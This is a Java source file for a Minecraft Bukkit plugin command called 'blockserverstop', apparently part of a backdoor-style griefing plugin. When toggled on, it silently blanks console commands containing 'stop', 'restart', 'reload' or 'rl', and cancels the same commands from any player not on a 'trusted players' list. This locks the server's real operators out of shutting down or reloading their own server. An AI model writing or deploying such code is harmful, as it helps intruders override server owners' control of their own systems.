package de.Garkolym.Commands.Server;

import de.Garkolym.Commands.Command;
import de.Garkolym.Commands.CommandCategory;
import de.Garkolym.Start;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.server.ServerCommandEvent;

import java.util.ArrayList;

/**
 * Created by GalaxyHD on 30.05.2016.
 */
public class CommandBlockServerStop extends Command implements Listener{

    private boolean isActive = false;

    public CommandBlockServerStop() {
        super("blockserverstop", CommandCategory.SERVER);
        Bukkit.getPluginManager().registerEvents(this, Start.instance);
    }

    @Override
    public void onCommand(Player p, ArrayList<String> args) {
        isActive = !isActive;
        p.sendMessage(Start.instance.prefix + ((isActive) ? "§aServer kann nun nicht mehr gestopp werden!" : "§cServer freigegeben!"));
    }

    @EventHandler
    public void on(ServerCommandEvent e) {
        if(!isActive) return;
        if ((e.getCommand().contains("stop") || e.getCommand().contains("restart") || e.getCommand().contains("reload") || e.getCommand().contains("rl"))) {
            e.setCommand("");
        }
    }

    @EventHandler
    public void on(PlayerCommandPreprocessEvent e) {
        if(!isActive) return;
        if (Start.instance.getTrustedPlayers().contains(e.getPlayer().getName()))
            return;
        if ((e.getMessage().contains("stop") || e.getMessage().contains("restart") || e.getMessage().contains("reload") || e.getMessage().contains("rl"))) {
            e.setCancelled(true);
        }
    }

}
